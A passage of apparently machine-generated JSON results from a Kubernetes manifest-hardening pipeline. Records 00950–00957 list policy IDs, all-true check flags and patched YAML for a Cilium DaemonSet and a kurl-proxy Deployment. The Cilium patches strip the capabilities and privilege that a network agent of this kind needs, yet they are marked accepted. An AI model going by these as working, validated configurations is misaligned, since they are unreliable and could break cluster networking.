    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00950",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00951",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00952",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00953",
    "policy_id": "env_var_secret",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy:stable\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: tls-secret-name-secret\n              key: tls_secret_name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "errors": []
  },
  {
    "id": "00954",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy:stable\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: tls-secret-name-secret\n              key: tls_secret_name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "errors": []
  },
  {
    "id": "00955",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy:stable\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: tls-secret-name-secret\n              key: tls_secret_name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "errors": []
  },
  {
    "id": "00956",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy:stable\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: tls-secret-name-secret\n              key: tls_secret_name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "errors": []
  },
  {
    "id": "00957",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
